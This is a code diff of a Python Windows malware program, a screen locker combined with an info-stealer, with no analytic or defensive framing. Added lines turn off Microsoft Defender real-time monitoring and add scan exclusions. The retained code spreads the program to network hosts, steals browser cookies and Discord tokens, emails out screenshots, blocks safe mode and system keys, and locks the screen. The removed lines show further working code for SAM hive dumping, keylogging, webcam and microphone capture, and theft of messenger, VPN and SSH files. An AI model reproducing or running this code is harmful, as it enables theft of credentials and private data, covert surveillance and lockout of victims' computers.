@@ -8,7 +8,7 @@ from email.mime.base import MIMEBase
 from email import encoders
 import cv2, numpy as np
 from PIL import ImageGrab, Image, ImageDraw
-import sqlite3, winreg, zipfile, win32crypt, re, glob as _glob, wave
+import sqlite3, winreg, zipfile, win32crypt, re, wave
 from win32com.client import Dispatch
 
 PASSWORD = "1601"
@@ -55,25 +55,18 @@ def is_vm():
     except: pass
     return False
 
+def bypass_defender():
+    try:
+        if is_admin():
+            for p in [tempfile.gettempdir(), os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')]:
+                os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{p}\'" >nul 2>&1')
+            os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1')
+    except: pass
+
 def block_safe_mode():
     try:
         if is_admin():
             os.system('bcdedit /deletevalue {current} safeboot >nul 2>&1')
-            os.system('bcdedit /set {current} bootstatuspolicy ignoreallfailures >nul 2>&1')
-            os.system('bcdedit /set {current} recoveryenabled no >nul 2>&1')
-    except: pass
-
-def install_bootkit():
-    try:
-        if is_admin():
-            cp = os.path.abspath(__file__)
-            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
-            for key_path in [r"Software\Microsoft\Windows\CurrentVersion\Run", r"Software\Microsoft\Windows\CurrentVersion\RunOnce"]:
-                try:
-                    k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
-                    winreg.SetValueEx(k, "WindowsService", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
-                    winreg.CloseKey(k)
-                except: pass
     except: pass
 
 def scan_network():
@@ -85,17 +78,7 @@ def scan_network():
 def infect_other_pcs():
     for ip in scan_network():
         try:
-            os.system(f'net use \\\\{ip}\\C$ /user:admin admin >nul 2>&1')
-            if os.path.exists(__file__):
-                shutil.copy2(__file__, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
-            os.system(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw" >nul 2>&1')
-        except: pass
-
-def control_router(action="reboot"):
-    for ip, user, pwd in [("192.168.1.1", "admin", "admin"), ("192.168.0.1", "admin", "1234")]:
-        try:
-            if action == "reboot":
-                urllib.request.urlopen(f"http://{ip}/reboot.cgi", timeout=3)
+            shutil.copy2(__file__, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
         except: pass
 
 def send_email(msg, subj=None):
@@ -215,12 +198,6 @@ def get_ssh_targets():
             if '.' in line:
                 gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
                 if gw and not gw[0].startswith('0.'): targets.append(("GATEWAY", gw[0], "Router")); break
-    except: pass
-    try:
-        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-        for ip in list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))[:10]:
-            if ip not in [t[1] for t in targets] and not ip.endswith('.255') and not ip.endswith('.0'):
-                targets.append(("NETWORK", ip, "Device"))
     except: pass
     for i, (name, ip, desc) in enumerate(targets):
         for port in [22, 23]:
@@ -358,8 +335,7 @@ def steal_firefox():
 
 def steal_cookies():
     r = []
-    for cp in [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
-               os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies')]:
+    for cp in [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')]:
         if not os.path.exists(cp): continue
         try:
             db = os.path.join(tempfile.gettempdir(), f'ck_{random.randint(0,9999)}.db')
@@ -374,117 +350,6 @@ def steal_cookies():
             cur.close(); os.remove(db)
         except: pass
     return r[:300] if r else ["No cookies"]
-
-def dump_sam():
-    if not is_admin(): return "No admin"
-    try:
-        sp = os.path.join(tempfile.gettempdir(), 'sam'); syp = os.path.join(tempfile.gettempdir(), 'system')
-        os.system(f'reg save HKLM\\SAM "{sp}" /y >nul 2>&1')
-        os.system(f'reg save HKLM\\SYSTEM "{syp}" /y >nul 2>&1')
-        if os.path.exists(sp) and os.path.getsize(sp) > 100:
-            z = os.path.join(tempfile.gettempdir(), 'sam.zip')
-            with zipfile.ZipFile(z, 'w') as zf: zf.write(sp, 'sam'); zf.write(syp, 'system')
-            send_file_email(z, "[DedSek_Logs] SAM+SYSTEM")
-            try: os.remove(z); os.remove(sp); os.remove(syp)
-            except: pass
-            return "SAM dumped!"
-    except: pass
-    return "Failed"
-
-def capture_webcam():
-    try:
-        cam = cv2.VideoCapture(0)
-        if cam.isOpened():
-            ret, frame = cam.read()
-            if ret:
-                fp = os.path.join(tempfile.gettempdir(), f'cam_{int(time.time())}.jpg')
-                cv2.imwrite(fp, frame)
-                send_file_email(fp, "[DedSek_Logs] Webcam")
-                try: os.remove(fp)
-                except: pass
-        cam.release()
-    except: pass
-
-def record_mic():
-    try:
-        import pyaudio
-        CHUNK, FORMAT, CHANNELS, RATE, SEC = 1024, pyaudio.paInt16, 1, 44100, 30
-        p = pyaudio.PyAudio()
-        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
-        frames = []
-        for _ in range(0, int(RATE/CHUNK*SEC)):
-            try: frames.append(stream.read(CHUNK, exception_on_overflow=False))
-            except: break
-        stream.stop_stream(); stream.close(); p.terminate()
-        fp = os.path.join(tempfile.gettempdir(), f'mic_{int(time.time())}.wav')
-        wf = wave.open(fp, 'wb')
-        wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT)); wf.setframerate(RATE)
-        wf.writeframes(b''.join(frames)); wf.close()
-        send_file_email(fp, "[DedSek_Logs] Mic")
-        try: os.remove(fp)
-        except: pass
-    except: pass
-
-def keylogger_thread():
-    try:
-        import keyboard
-        def on_key(e):
-            global keylog_data
-            keylog_data.append(f"{time.strftime('%H:%M:%S')} | {e.name}")
-            if len(keylog_data) >= 100:
-                send_email('\n'.join(keylog_data), "[DedSek_Logs] Keylogger")
-                keylog_data.clear()
-        keyboard.on_press(on_key)
-    except: pass
-
-def steal_telegram():
-    tg = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
-    if not os.path.exists(tg): return
-    try:
-        z = os.path.join(tempfile.gettempdir(), 'telegram.zip')
-        with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
-            for r, d, files in os.walk(tg):
-                for f in files:
-                    if not f.endswith('.exe') and not f.endswith('.dll'):
-                        zf.write(os.path.join(r, f), os.path.relpath(os.path.join(r, f), tg))
-        send_file_email(z, "[DedSek_Logs] Telegram")
-        try: os.remove(z)
-        except: pass
-    except: pass
-
-def steal_steam():
-    steam = os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'Steam')
-    if os.path.exists(steam):
-        for f in ['config/loginusers.vdf', 'config/config.vdf']:
-            fp = os.path.join(steam, f)
-            if os.path.exists(fp): send_file_email(fp, f"[DedSek_Logs] Steam {os.path.basename(fp)}")
-
-def steal_vpn():
-    for path in [os.path.join(os.environ['USERPROFILE'], 'OpenVPN', 'config'),
-                 os.path.join(os.environ['PROGRAMFILES'], 'OpenVPN', 'config'),
-                 os.path.join(os.environ['PROGRAMFILES'], 'WireGuard', 'Data')]:
-        if os.path.exists(path):
-            for f in os.listdir(path):
-                fp = os.path.join(path, f)
-                if f.endswith('.ovpn') or f.endswith('.conf') or f.endswith('.key'):
-                    send_file_email(fp, f"[DedSek_Logs] VPN {f}")
-
-def steal_configs():
-    for name, path in {"SSH": os.path.join(os.environ['USERPROFILE'], '.ssh', 'id_rsa'),
-                       "RDP": os.path.join(os.environ['USERPROFILE'], 'Documents', 'Default.rdp'),
-                       "FileZilla": os.path.join(os.environ['APPDATA'], 'FileZilla', 'sitemanager.xml')}.items():
-        if os.path.exists(path) and os.path.getsize(path) < 5*1024*1024:
-            send_file_email(path, f"[DedSek_Logs] Config {name}")
-
-def steal_clipboard():
-    try:
-        import win32clipboard
-        win32clipboard.OpenClipboard()
-        if win32clipboard.IsClipboardFormatAvailable(1):
-            data = win32clipboard.GetClipboardData()
-            if data: send_email(f"CLIPBOARD:\n{str(data)[:2000]}", "[DedSek_Logs] Clipboard")
-        win32clipboard.CloseClipboard()
-    except: pass
 
 def mega_steal():
     targets = get_ssh_targets()
@@ -505,12 +370,9 @@ def mega_steal():
     if cookies and cookies != ["No cookies"]: report.append("\nCOOKIES:"); report.extend(cookies)
     tokens = steal_discord()
     report.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["No tokens"])
-    report.append(f"\nSAM: {dump_sam()}")
-    report.append(f"\nОТЧЁТ: {time.strftime('%d.%m.%Y %H:%M:%S')}")
+    report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
     text = '\n'.join(report)
     for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")
-    for t in [steal_telegram, steal_steam, steal_vpn, steal_configs, steal_clipboard, capture_webcam, record_mic]:
-        threading.Thread(target=t, daemon=True).start()
     try:
         ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
         ImageGrab.grab().save(ss, 'JPEG', quality=50)
@@ -519,30 +381,10 @@ def mega_steal():
         except: pass
     except: pass
 
-def record_loop():
-    while True:
-        try:
-            vp = os.path.join(tempfile.gettempdir(), f"v_{int(time.time())}.avi")
-            out = cv2.VideoWriter(vp, cv2.VideoWriter_fourcc(*'XVID'), 10.0, (1280, 720))
-            for _ in range(150):
-                out.write(cv2.resize(cv2.cvtColor(np.array(ImageGrab.grab()), cv2.COLOR_BGR2RGB), (1280, 720)))
-                time.sleep(0.1)
-            out.release()
-            if os.path.getsize(vp) > 20*1024*1024:
-                try:
-                    out2 = vp.replace('.avi', '.mp4')
-                    subprocess.run(['ffmpeg', '-i', vp, '-c:v', 'libx264', '-preset', 'ultrafast', '-crf', '35', '-b:v', '200k', '-s', '640x360', '-r', '10', '-y', out2], capture_output=True, timeout=30)
-                    vp = out2
-                except: pass
-            send_file_email(vp, "[DedSek_Logs] Video")
-            try: os.remove(vp)
-            except: pass
-        except: time.sleep(1)
-
 def block_keys():
     try:
         import keyboard
-        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen','alt+print screen']:
+        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
     except: pass
@@ -562,11 +404,6 @@ def kill_procs():
 def reset_windows():
     try:
         restore_win_key(); unblock()
-        es = tk.Tk(); es.attributes('-fullscreen', True); es.attributes('-topmost', True)
-        es.configure(bg='black'); es.overrideredirect(True)
-        tk.Label(es, text="404 | ОШИБКА", bg='black', fg='white', font=('Courier',40,'bold')).pack(expand=True)
-        tk.Label(es, text="ВСЕ ДАННЫЕ УНИЧТОЖАЮТСЯ...", bg='black', fg='white', font=('Courier',20)).pack()
-        es.update(); time.sleep(5); es.destroy()
         os.system("shutdown /r /t 0 /f"); os._exit(0)
     except: os.system("shutdown /r /t 0 /f"); os._exit(0)
 
@@ -648,18 +485,19 @@ class WinLocker:
             self.pw.delete(0, tk.END)
 
 if __name__ == "__main__":
-    hide_console(); disable_win_key(); add_to_startup()
+    print("STARTING...")
+    hide_console()
+    disable_win_key()
+    bypass_defender()
+    add_to_startup()
     
     if is_vm():
         send_email("VM DETECTED", "Anti-VM")
         os._exit(0)
     
     block_safe_mode()
-    install_bootkit()
     
     threading.Thread(target=mega_steal, daemon=True).start()
-    threading.Thread(target=record_loop, daemon=True).start()
-    threading.Thread(target=keylogger_thread, daemon=True).start()
     threading.Thread(target=kill_procs, daemon=True).start()
     
     time.sleep(3)
@@ -672,10 +510,10 @@ if __name__ == "__main__":
     except: pass
     
     threading.Thread(target=infect_other_pcs, daemon=True).start()
-    threading.Thread(target=lambda: control_router("reboot"), daemon=True).start()
     
     try: block_keys()
     except: pass
     
+    print("SHOWING LOCKER...")
     WinLocker()
     tk.mainloop()
